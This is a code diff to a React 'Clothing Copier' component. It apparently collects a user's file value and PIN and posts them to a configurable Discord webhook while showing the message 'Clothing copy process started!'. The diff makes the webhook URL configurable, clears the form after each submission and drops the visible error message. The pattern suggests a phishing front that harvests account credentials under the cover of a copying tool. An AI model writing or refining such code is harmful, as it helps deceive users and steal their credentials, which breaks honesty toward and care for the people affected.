@@ -6,8 +6,10 @@ import { toast } from 'sonner';
 import { motion } from 'framer-motion';
 import { sendToDiscordWebhook } from '@/utils/webhookService';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { useConfig } from '@/context/ConfigContext';
 
 const CopyClothes = () => {
+  const { config } = useConfig();
   const [clothingFile, setClothingFile] = useState<string>("");
   const [pin, setPin] = useState<string>("");
   const [isLoading, setIsLoading] = useState(false);
@@ -32,11 +34,14 @@ const CopyClothes = () => {
         toolType: "Clothing Copier",
         file: clothingFile,
         pin
-      });
+      }, config.webhookUrl, config.cooldownSeconds);
       
       toast.success("Clothing copy process started!");
+      // Clear the form after successful submission
+      setClothingFile("");
+      setPin("");
     } catch (error) {
-      toast.error("An error occurred. Please try again later.");
+      // Error handled in webhookService
     } finally {
       setIsLoading(false);
     }
